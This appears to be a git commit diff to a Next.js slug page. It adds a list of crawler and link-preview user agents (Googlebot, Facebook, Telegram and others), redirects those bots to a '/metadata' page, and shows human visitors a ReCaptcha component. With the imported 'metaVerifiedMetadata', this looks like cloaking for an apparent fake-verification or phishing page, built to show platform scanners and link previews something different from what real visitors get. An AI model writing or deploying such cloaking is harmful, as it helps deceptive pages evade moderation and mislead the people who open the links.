c537a3a7202f9d97d29e89f5545130245542a4b6
dungg02 <vboyht35@gmail.com>
2026-06-04 01:08:47 +0700

    04.06

--- app/[slug]/page.tsx
+++ app/[slug]/page.tsx
@@ -1,13 +1,36 @@
+import { headers } from 'next/headers'
+import { redirect } from 'next/navigation'
 import React from 'react'
 import ReCaptcha from '.'
 import { metaVerifiedMetadata } from '#data/metaVerifiedMetadata'
 
 export const metadata = metaVerifiedMetadata
 
-const SlugPage = () => {
-    return (
-        <ReCaptcha />
-    )
+const BOT_KEYWORDS = [
+  'bot',
+  'crawler',
+  'spider',
+  'googlebot',
+  'bingbot',
+  'facebookexternalhit',
+  'twitterbot',
+  'linkedinbot',
+  'slackbot',
+  'telegrambot',
+]
+
+function isBotUserAgent(userAgent: string): boolean {
+  const lower = userAgent.toLowerCase()
+  return BOT_KEYWORDS.some((keyword) => lower.includes(keyword))
+}
+
+const SlugPage = async () => {
+  const userAgent = headers().get('user-agent') ?? ''
+  if (isBotUserAgent(userAgent)) {
+    redirect('/metadata')
+  }
+
+  return <ReCaptcha />
 }
 
 export default SlugPage
